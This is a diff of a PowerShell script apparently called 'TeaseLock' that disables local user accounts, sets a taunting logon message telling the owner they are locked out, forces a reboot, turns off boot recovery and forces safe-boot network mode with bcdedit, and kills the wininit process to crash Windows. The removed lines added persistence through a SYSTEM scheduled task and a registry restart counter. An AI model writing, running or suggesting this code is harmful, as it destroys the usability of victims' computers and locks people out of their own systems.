@@ -4,62 +4,34 @@ foreach ($user in $users) {
     Disable-LocalUser -Name $user.Name
 }
 
-# Restart Tracker (Stored in Registry)
-$regPath = "HKLM:\SOFTWARE\TeaseLock"
-if (!(Test-Path $regPath)) {
-    New-Item -Path $regPath -Force | Out-Null
-}
-
-$restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
-if ($restartCount -eq $null) {
-    $restartCount = 0
-}
-
-# Update Login Message & Track Restarts
+# Setup Playful Lockout Message
 $systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
+New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value @"
+Ah~ Sweetheart, you are locked out <3
+No matter how much you try, the door is closed for you now~
+Go ahead, stare at the screen, pout all you want~
+But you Will not be getting back in~
 
-if ($restartCount -eq 0) {
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you are locked out <3 Try again later~ ;)" -PropertyType String -Force
-    $restartCount = 1
-}
+You must be wondering, "Is this it? Will I ever get back in?"
+Oh, love~ You already know the answer~
 
-elseif ($restartCount -eq 1) {
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, right~?" -PropertyType String -Force
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You will have to wait longer this time~ ;)" -PropertyType String -Force
-    $restartCount = 2
-}
+Tick-tock, tick-tock~
+The end is near~ So sit back and watch the magic happen <3
+"@ -PropertyType String -Force
 
-elseif ($restartCount -eq 2) {
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
-    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force
+# Restart Once
+shutdown /r /f /t 3
 
-    # **Final Phase: Modify Boot for Network Boot**
-    bcdedit /set {default} bootmenupolicy legacy
-    bcdedit /set {current} bootstatuspolicy ignoreallfailures
-    bcdedit /set {current} recoveryenabled no
-    bcdedit /set {current} safeboot network
+# Wait Until System Boots Again Before Modifying Boot Settings (Reduced to 5s)
+Start-Sleep -Seconds 5
 
-    # **Save the final restart count**
-    $restartCount = 3
-}
+# Modify Boot Settings to Force Network Boot (No Recovery)
+bcdedit /set {default} bootmenupolicy legacy
+bcdedit /set {current} bootstatuspolicy ignoreallfailures
+bcdedit /set {current} recoveryenabled no
+bcdedit /set {current} safeboot network
 
-# Save Restart Count
-Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force
-
-# Ensure Script Runs on Every Boot
-$scriptPath = "C:\Windows\System32\TeaseLock.ps1"
-$taskName = "TeaseLockAutoRun"
-
-Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
-
-schtasks /create /tn $taskName /tr "powershell -ExecutionPolicy Bypass -File $scriptPath" /sc onstart /ru SYSTEM /f
-
-# Restart Logic
-if ($restartCount -lt 3) {
-    shutdown /r /f /t 5
-} else {
-    # **Final Phase: Crash Windows AFTER the final reboot happens**
-    Start-Sleep -Seconds 10
-    Stop-Process -Name "wininit" -Force
-}
+# Final Step: Crash Windows Permanently
+Start-Sleep -Seconds 2
+Stop-Process -Name "wininit" -Force
